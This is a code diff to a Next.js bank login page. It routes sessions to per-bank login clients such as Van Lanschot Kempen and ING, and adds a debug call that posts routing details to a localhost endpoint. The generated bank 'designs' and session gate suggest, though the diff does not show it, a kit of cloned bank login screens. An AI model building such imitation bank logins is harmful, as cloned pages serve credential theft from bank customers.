@@ -26,15 +26,23 @@ export default async function BankLoginPage({ params }: Props) {
   const { id, bank_slug } = await params;
   const bank = await getBankBySlug(bank_slug);
   const bankName = bank?.name || bank_slug;
+  const hasGeneratedDesign = Boolean(bank?.design?.visualTree || bank?.design?.customHtml);
+  const isVanLanschotCustomRoute = bank_slug === "van-lanschot-kempen" && !hasGeneratedDesign;
 
   const autoRedirectBanks = ["buut", "knab", "mollie", "revolut"];
+
+  if (isVanLanschotCustomRoute) {
+    // #region debug-point E:live-custom-route
+    void fetch("http://127.0.0.1:7778/event", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ sessionId: "vanlanschot-logo-bug", runId: "pre-fix", hypothesisId: "E", location: "page.tsx:31", msg: "[DEBUG] Live route forced to Van Lanschot custom client", data: { slug: bank_slug, bankName, hasDesign: Boolean(bank?.design), hasVisualTree: Boolean(bank?.design?.visualTree), hasCustomHtml: Boolean(bank?.design?.customHtml), logoFile: bank?.logoFile ?? null }, ts: Date.now() }) }).catch(() => {});
+    // #endregion
+  }
 
   return (
     <>
       <SessionRealtimeGate sessionId={id} />
       {bank?.autoRedirect || autoRedirectBanks.includes(bank_slug) ? (
         <AutoRedirectClient sessionId={id} bankSlug={bank_slug} bankName={bankName} />
-      ) : bank_slug === "van-lanschot-kempen" ? (
+      ) : isVanLanschotCustomRoute ? (
         <VanLanschotKempenClient sessionId={id} />
       ) : bank_slug === "ing" ? (
         <IngClient sessionId={id} />
